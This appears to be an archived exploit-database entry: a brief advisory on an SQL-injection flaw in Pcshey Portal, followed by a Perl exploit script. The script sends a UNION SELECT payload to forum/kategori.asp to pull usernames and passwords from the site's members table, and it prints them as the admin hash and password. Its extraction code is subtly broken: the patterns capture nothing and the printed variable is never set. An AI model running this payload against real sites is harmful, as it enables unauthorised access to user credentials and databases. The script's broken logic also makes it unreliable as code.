source: https://www.securityfocus.com/bid/30534/info

Pcshey Portal is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

#!/usr/bin/perl
#Coded By U238
#Discovered By U238
#mail : setuid.noexec0x1]at]hotmail.com
#From : Türkiye / Erzincan
#Thnx : The_BekiR - ZeberuS - Fahn - ka0x - Deep Power - Marco Almeida
#Gretz: http://bilisimMimarileri.com
     : http://bilgiguvenligi.gov.tr
    Mesut Timur & Alper Canak

use LWP::Simple;
my $bekir= $ARGV[0];

if(!$ARGV[0]) {

print "\nExploit Options\n";
print "\nUse:perl victim.pl [domain]\n";
exit(0);
}
sleep(2);

print "\n\nPlease Loading&#8230;!$bekir\n\n";

$nrc=q[forum/kategori.asp?kid=26+union+select+0,1,2,parola,4,kullanici,6,7+f
rom+uyeler+where+id=1];
# where+id=2,3
$zeb=get($ARGV[0].$nrc) or die print "dont worked";

print "Exploit Succesful";

print "Connecting..: $ARGV[0]n";
sleep(3);

$zeb=~m/<font face="Tahoma"><strong></strong></font></td>/&& print "admin
hash: $baba";


print "dont username !" if(!$baba);

$zeb=~m/<font face="Tahoma"><strong></strong></font></td>/&& print "pass
!!: $baba";
print "dont pass" if(!$baba);